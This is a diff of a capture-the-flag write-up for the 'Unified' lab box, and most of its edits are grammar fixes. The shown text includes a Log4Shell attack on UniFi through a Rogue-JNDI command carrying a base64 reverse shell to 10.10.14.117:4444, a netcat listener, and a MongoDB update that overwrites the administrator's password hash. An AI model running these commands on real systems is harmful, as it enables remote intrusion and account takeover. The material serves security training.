@@ -1,17 +1,3 @@
----
-layout:
-  title:
-    visible: true
-  description:
-    visible: false
-  tableOfContents:
-    visible: true
-  outline:
-    visible: true
-  pagination:
-    visible: true
----
-
 # Unified (Tier 2)
 
 ## <mark style="color:blue;">Description</mark>
@@ -64,14 +50,14 @@ layout:
 
 ***
 
-* I found an HTTP service running on ports 8443 and 8080 so I went to the browser to explore them starting with port 8443. There I found a login page from a software named _Unifi_ as identified in the scan, and let me know the version for this software was _6.4.54_. I also tried logging in with common credentials but it didn't work. After that, I explored the _Forgot Password_ option which asked for an email to send a verification message, but as I was not registered it wouldn't work
+* I found an HTTP service running on ports 8443 and 8080, so I went to the browser to explore them, starting with port 8443. There I found a login page from a software named _Unifi,_ as identified in the scan, and let me know the version of this software was _6.4.54_. I also tried logging in with common credentials, but it didn't work. After that, I explored the _Forgot Password_ option, which asked for an email to send a verification message, but as I was not registered, it wouldn't work
 
 <figure><img src="../../.gitbook/assets/image (382).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (383).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about the HTTP protocol you can go [here](../../networks/protocols/http.md)
+To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
 {% endhint %}
 
 ***
@@ -104,7 +90,7 @@ To learn more about the HTTP protocol you can go [here](../../networks/protocols
 
 ***
 
-* So first, to start the process for the exploitation, I intercepted the petition from the login page and modified it inserting a payload in the _remember_ parameter. Then I set up a listener with [_tcpdump_](../../networks/tools-and-utilities.md#tcpdump) to check all the traffic over TCP, specifying in this case to listen on port 389, the default port for the _LDAP_ service communications. Then I resend the petition and checked the listener to confirm the service was connecting back to my machine, and in fact, it was
+* So first, to start the process for the exploitation, I intercepted the petition from the login page and modified it, inserting a payload in the _remember_ parameter. Then I set up a listener with [_tcpdump_](../../networks/tools-and-utilities.md#tcpdump) to check all the traffic over TCP, specifying in this case to listen on port 389, the default port for the _LDAP_ service communications. Then I resubmitted the petition and checked the listener to confirm the service was connecting back to my machine, and in fact, it was
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -119,7 +105,7 @@ sudo tcpdump -i tun0 port 389
 <figure><img src="../../.gitbook/assets/image (390).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn the complete process for the _Log4Shell_ vulnerability exploitation you can go [here](../../web-exploitation/broken-access-control/cve-log4shell.md)
+To learn the complete process for the _Log4Shell_ vulnerability and its exploitation, you can go [here](../../web-exploitation/broken-access-control/cve-log4shell.md)
 {% endhint %}
 
 ***
@@ -138,7 +124,7 @@ To learn the complete process for the _Log4Shell_ vulnerability exploitation you
 
 ***
 
-* Knowing this, I created a payload and mounted a server with _Rogue-JNDI_ to establish the communication and try to gain a reverse shell from the target machine. Then I set up a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener to receive communication and resent the petition this time pointing to the mounted server, and successfully caught a shell from the target confirming it with the `whomai` command. Then I sanitized the terminal to interact better with it
+* Knowing this, I created a payload and mounted a server with _Rogue-JNDI_ to establish the communication and try to gain a reverse shell from the target machine. Then I set up a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener to receive communication and resent the petition this time pointing to the mounted server, and successfully caught a shell from the target, confirming it with the `whomai` command. Then I sanitized the terminal to interact better with it
 
 <pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTE3LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.117"
 <strong>nc -nvlp444
@@ -160,7 +146,7 @@ To learn the complete process for the _Log4Shell_ vulnerability exploitation you
 
 ***
 
-* Then I had to find a way to escalate privileges. I started checking on the `sudo` execution permissions for the user, but the command wasn't on the system, and proving with some other common commands for retrieving information, they were not found. So I tried looking at the services running locally and found a [_MongoDB_](https://www.mongodb.com/) database was being deployed on port 27117
+* Then I had to find a way to escalate privileges. I started checking on the `sudo` execution permissions for the user, but the command wasn't on the system, and testing it with some other common commands for retrieving information, they were not found. So I tried looking at the services running locally and found that a [_MongoDB_](https://www.mongodb.com/) database was being deployed on port 27117
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -197,13 +183,13 @@ mongo --port 27117
 
 ***
 
-* Once inside I wanted to retrieve sensitive information, but I didn't know the components of the database, so first I searched for possible default names related to the _UniFi_ software, and with some research, found a [repository](https://gist.github.com/AmazingTurtle/e8a68a0cbe501bae15343aacbf42a1d8) that could help us to retrieve information and restore values to default for this specific software
+* Once inside, I wanted to retrieve sensitive information, but I didn't know the components of the database, so first I searched for possible default names related to the _UniFi_ software, and with some research, found a [repository](https://gist.github.com/AmazingTurtle/e8a68a0cbe501bae15343aacbf42a1d8) that could help us to retrieve information and restore values to default for this specific software
 
 <figure><img src="../../.gitbook/assets/image (399).png" alt=""><figcaption><p>snippet</p></figcaption></figure>
 
 ***
 
-* Following the guide I learned the default database for _UniFi_ was _ace_, so I accessed it and checked the collections it had. The _admin_ collection caught my attention so I retrieved its information and this revealed sensitive information about the _administrator_ user, including its email and the hash for the password it used
+* Following the guide, I learned the default database for _UniFi_ was _ace_, so I accessed it and checked the collections it had. The _admin_ collection caught my attention, so I retrieved its information, and this revealed sensitive information about the _administrator_ user, including its email and the hash for the password it used
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```mongodb
@@ -233,7 +219,7 @@ db.admin.find();
 
 ***
 
-* So I could try changing the value of the hash for one that represented an arbitrary password and in that way impersonate the administrator user. So I used a prehashed value from the previously found repository and tried to update this on the database. After that, as I didn't get any error I assumed it had worked, and then went again to the login page to try using the credentials I had set, having access to a dashboard for a network configuration software.
+* So I tried changing the value of the hash for one that represented an arbitrary password, to impersonate the administrator user. So I used a prehashed value from the previously found repository and tried to update this in the database. After that, as I didn't get any error, I assumed it had worked, and then went again to the login page to try using the credentials I had set, having access to a dashboard for a network configuration software.
 
 <pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"># We used the SHA512 for Ch4ngeM3VeryQu!ck taken from the GitHub guide
 <strong>db.admin.update({ "name": "administrator" }, { $set: { "x_shadow": "$6$9Ter1EZ9$4RCTnLfeDJsdAQ16M5d1d5Ztg2CE1J2IDlbAPSUcqYOoxjEEcpMQag41dtCQv2cJ.n9kvlx46hNT78dngJBVt0" } });
@@ -244,7 +230,7 @@ db.admin.find();
 <figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about Impersonification via credentials change on _MongoDB_ you can go here
+To learn more about Impersonification via credentials change on _MongoDB,_ you can go here
 {% endhint %}
 
 ***
